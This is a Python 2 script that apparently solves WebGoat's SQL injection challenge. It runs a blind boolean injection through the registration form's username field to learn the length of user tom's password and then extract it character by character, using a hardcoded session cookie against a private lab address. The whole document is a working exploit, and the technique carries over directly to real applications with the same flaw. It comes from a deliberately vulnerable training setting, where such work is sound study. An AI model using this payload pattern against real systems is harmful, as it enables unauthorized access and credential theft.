import requests

password = str()

url = "http://172.20.100.28:8080/WebGoat/SqlInjection/challenge"
cookie = {'JSESSIONID': 'B30C01C30D5696AB0DC907A79D3738A0'}

print 'Get password length...'
password_length = int()
for length in range(1, 50):
    data = {'username_reg': "tom' and length(password) = %d and '1'='1" % length, 'email_reg': 'test@test.com', 'password_reg': '1', 'confirm_password_reg': '1'}

    r = requests.put(url,data, cookies=cookie)

    if 'created' in r.content:
        continue

    if 'exists' in r.content:
        password_length = length
        break

print 'Done!!!'
print "Length of password is %d." % password_length

print 'Hack the password!!!'
for i in range(1, password_length + 1):
    for c in range(0x21, 0x7b):
        payload = "tom' and substr(password, %d, 1) = '%c' and '1'='1" % (i, c)
        data = {'username_reg': payload, 'email_reg': 'test@test.com', 'password_reg':'1', 'confirm_password_reg':'1'}

        r = requests.put(url, data, cookies=cookie)

        if 'created' in r.content:
            continue

        if 'exists' in r.content:
            password += chr(c)

print 'Found!!!'
print "Tom's password: %s" % password
